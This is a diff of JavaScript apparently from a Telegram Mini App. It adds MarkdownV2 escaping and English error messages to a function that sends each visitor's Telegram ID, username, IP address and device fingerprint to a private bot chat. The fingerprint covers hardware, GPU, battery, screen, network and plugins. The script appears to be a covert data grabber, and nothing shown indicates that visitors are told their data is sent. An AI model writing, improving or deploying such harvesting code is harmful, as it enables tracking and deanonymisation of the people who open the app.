@@ -19,9 +19,15 @@
     const userId = tg?.initDataUnsafe?.user?.id;
     const username = tg?.initDataUnsafe?.user?.username || 'не указан';
 
-    // Вспомогательная функция для отображения сообщений (если нужно)
+    // Вспомогательная функция для отображения сообщений
     function showMessage(message) {
         console.log(message);
+    }
+
+    // Функция для экранизации спецсимволов MarkdownV2
+    function escapeMarkdown(text) {
+        if (typeof text !== 'string') return text;
+        return text.replace(/[_*[\]()~`>#+\-=|{}.!-]/g, '\\$&');
     }
 
     // Detect browser features
@@ -205,76 +211,76 @@
 
             // Telegram user info
             text += `👤 *Telegram User*\n`;
-            text += `🆔 *ID:* ${data.telegram.userId || 'неизвестен'}\n`;
-            text += `📛 *Username:* ${data.telegram.username || 'не указан'}\n\n`;
+            text += `🆔 *ID\\:* ${escapeMarkdown(data.telegram.userId || 'неизвестен')}\n`;
+            text += `📛 *Username\\:* ${escapeMarkdown(data.telegram.username || 'не указан')}\n\n`;
 
             // Basic info
-            text += `📅 *Timestamp:* ${data.timestamp}\n`;
-            text += `🌐 *User Agent:* ${data.userAgent}\n`;
-            text += `💻 *Platform:* ${data.platform}\n`;
-            text += `🏷 *Vendor:* ${data.vendor || 'unknown'}\n`;
-            text += `🗣 *Language:* ${data.language}\n\n`;
+            text += `📅 *Timestamp\\:* ${escapeMarkdown(data.timestamp)}\n`;
+            text += `🌐 *User Agent\\:* ${escapeMarkdown(data.userAgent)}\n`;
+            text += `💻 *Platform\\:* ${escapeMarkdown(data.platform)}\n`;
+            text += `🏷 *Vendor\\:* ${escapeMarkdown(data.vendor || 'unknown')}\n`;
+            text += `🗣 *Language\\:* ${escapeMarkdown(data.language)}\n\n`;
 
             // Hardware
             text += `⚙️ *Hardware Information*\n`;
-            text += `🔢 *CPU Cores:* ${data.cpuCores}\n`;
-            text += `🧠 *Device Memory:* ${data.deviceMemory}\n`;
-            text += `🎮 *GPU Vendor:* ${typeof data.gpu === 'object' ? data.gpu.vendor : data.gpu}\n`;
-            text += `🖥 *GPU Model:* ${typeof data.gpu === 'object' ? data.gpu.renderer : 'N/A'}\n`;
-            text += `🔋 *Battery:* ${typeof data.battery === 'object' ? `${data.battery.level} (${data.battery.charging ? 'charging' : 'discharging'})` : data.battery}\n\n`;
+            text += `🔢 *CPU Cores\\:* ${escapeMarkdown(data.cpuCores)}\n`;
+            text += `🧠 *Device Memory\\:* ${escapeMarkdown(data.deviceMemory)}\n`;
+            text += `🎮 *GPU Vendor\\:* ${typeof data.gpu === 'object' ? escapeMarkdown(data.gpu.vendor) : escapeMarkdown(data.gpu)}\n`;
+            text += `🖥 *GPU Model\\:* ${typeof data.gpu === 'object' ? escapeMarkdown(data.gpu.renderer) : 'N/A'}\n`;
+            text += `🔋 *Battery\\:* ${typeof data.battery === 'object' ? `${escapeMarkdown(data.battery.level)} \\(${data.battery.charging ? 'charging' : 'discharging'}\\)` : escapeMarkdown(data.battery)}\n\n`;
 
             // Screen
             text += `🖥 *Screen Information*\n`;
-            text += `📏 *Resolution:* ${data.screen.width}x${data.screen.height}\n`;
-            text += `🖼 *Available:* ${data.screen.availWidth}x${data.screen.availHeight}\n`;
-            text += `🎨 *Color Depth:* ${data.screen.colorDepth}-bit\n`;
-            text += `🔍 *Pixel Ratio:* ${data.screen.pixelRatio}\n`;
-            text += `🔄 *Orientation:* ${data.screen.orientation}\n\n`;
+            text += `📏 *Resolution\\:* ${escapeMarkdown(data.screen.width)}x${escapeMarkdown(data.screen.height)}\n`;
+            text += `🖼 *Available\\:* ${escapeMarkdown(data.screen.availWidth)}x${escapeMarkdown(data.screen.availHeight)}\n`;
+            text += `🎨 *Color Depth\\:* ${escapeMarkdown(data.screen.colorDepth)}\\-bit\n`;
+            text += `🔍 *Pixel Ratio\\:* ${escapeMarkdown(data.screen.pixelRatio)}\n`;
+            text += `🔄 *Orientation\\:* ${escapeMarkdown(data.screen.orientation)}\n\n`;
 
             // Network
             text += `🌐 *Network Information*\n`;
             if (typeof data.network === 'object') {
-                text += `📶 *Connection Type:* ${data.network.type}\n`;
-                text += `⬇️ *Download Speed:* ${data.network.downlink}\n`;
-                text += `⏱ *Round Trip Time:* ${data.network.rtt}\n`;
-                text += `💾 *Data Saver Mode:* ${data.network.saveData ? 'on' : 'off'}\n`;
+                text += `📶 *Connection Type\\:* ${escapeMarkdown(data.network.type)}\n`;
+                text += `⬇️ *Download Speed\\:* ${escapeMarkdown(data.network.downlink)}\n`;
+                text += `⏱ *Round Trip Time\\:* ${escapeMarkdown(data.network.rtt)}\n`;
+                text += `💾 *Data Saver Mode\\:* ${data.network.saveData ? 'on' : 'off'}\n`;
             } else {
-                text += `${data.network}\n`;
+                text += `${escapeMarkdown(data.network)}\n`;
             }
 
             // IP Info
             if (typeof data.ipInfo === 'object') {
-                text += `📍 *IP Address:* ${data.ipInfo.ip}\n`;
+                text += `📍 *IP Address\\:* ${escapeMarkdown(data.ipInfo.ip)}\n`;
             } else {
-                text += `${data.ipInfo}\n\n`;
+                text += `${escapeMarkdown(data.ipInfo)}\n\n`;
             }
 
             // Features
             text += `✨ *Browser Features*\n`;
-            text += `🍪 *Cookies:* ${data.features.cookies ? 'enabled' : 'disabled'}\n`;
-            text += `🚫 *Do Not Track:* ${data.features.doNotTrack}\n`;
-            text += `☕ *Java:* ${data.features.java ? 'enabled' : 'disabled'}\n`;
-            text += `📄 *PDF Viewer:* ${data.features.pdf ? 'enabled' : 'disabled'}\n`;
-            text += `👆 *Touch Support:* ${data.features.touch ? 'yes' : 'no'}\n`;
-            text += `🖍️ *WebGL:* ${data.features.webgl ? 'supported' : 'not supported'}\n`;
-            text += `🔊 *Web Audio:* ${data.features.webaudio ? 'supported' : 'not supported'}\n\n`;
+            text += `🍪 *Cookies\\:* ${data.features.cookies ? 'enabled' : 'disabled'}\n`;
+            text += `🚫 *Do Not Track\\:* ${escapeMarkdown(data.features.doNotTrack)}\n`;
+            text += `☕ *Java\\:* ${data.features.java ? 'enabled' : 'disabled'}\n`;
+            text += `📄 *PDF Viewer\\:* ${data.features.pdf ? 'enabled' : 'disabled'}\n`;
+            text += `👆 *Touch Support\\:* ${data.features.touch ? 'yes' : 'no'}\n`;
+            text += `🖍️ *WebGL\\:* ${data.features.webgl ? 'supported' : 'not supported'}\n`;
+            text += `🔊 *Web Audio\\:* ${data.features.webaudio ? 'supported' : 'not supported'}\n\n`;
 
             // Plugins
             text += `🧩 *Browser Plugins*\n`;
-            text += `${data.browser.plugins.join(', ') || 'No plugins detected'}\n\n`;
+            text += `${escapeMarkdown(data.browser.plugins.join(', ') || 'No plugins detected')}\n\n`;
 
             // Performance
             text += `⚡ *Performance Information*\n`;
             if (typeof data.performance.memory === 'object') {
-                text += `🧠 *Memory Usage:* ${Math.round(data.performance.memory.usedJSHeapSize / 1048576)}MB / ${Math.round(data.performance.memory.totalJSHeapSize / 1048576)}MB\n`;
+                text += `🧠 *Memory Usage\\:* ${Math.round(data.performance.memory.usedJSHeapSize / 1048576)}MB / ${Math.round(data.performance.memory.totalJSHeapSize / 1048576)}MB\n`;
             } else {
-                text += `${data.performance.memory}\n`;
+                text += `${escapeMarkdown(data.performance.memory)}\n`;
             }
 
             if (typeof data.performance.timing === 'object') {
-                text += `⏱ *Page Load Time:* ${data.performance.timing.loadTime}\n`;
+                text += `⏱ *Page Load Time\\:* ${escapeMarkdown(data.performance.timing.loadTime)}\n`;
             } else {
-                text += `${data.performance.timing}\n`;
+                text += `${escapeMarkdown(data.performance.timing)}\n`;
             }
 
             const response = await fetch(TELEGRAM_API_URL, {
@@ -285,21 +291,21 @@
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
                     text: text,
-                    parse_mode: 'Markdown',
+                    parse_mode: 'MarkdownV2',
                     disable_web_page_preview: true
                 })
             });
 
             if (!response.ok) {
-                throw new Error(`Ошибка HTTP: ${response.status}`);
+                throw new Error(`HTTP error: ${response.status}`);
             }
 
             const responseData = await response.json();
             if (!responseData.ok) {
-                throw new Error(`Ошибка Telegram API: ${responseData.description}`);
+                throw new Error(`Telegram API error: ${responseData.description}`);
             }
         } catch (error) {
-            console.error("Ошибка при отправке данных в Telegram:", error);
+            console.error("Error sending to Telegram:", error);
             throw error;
         }
     }
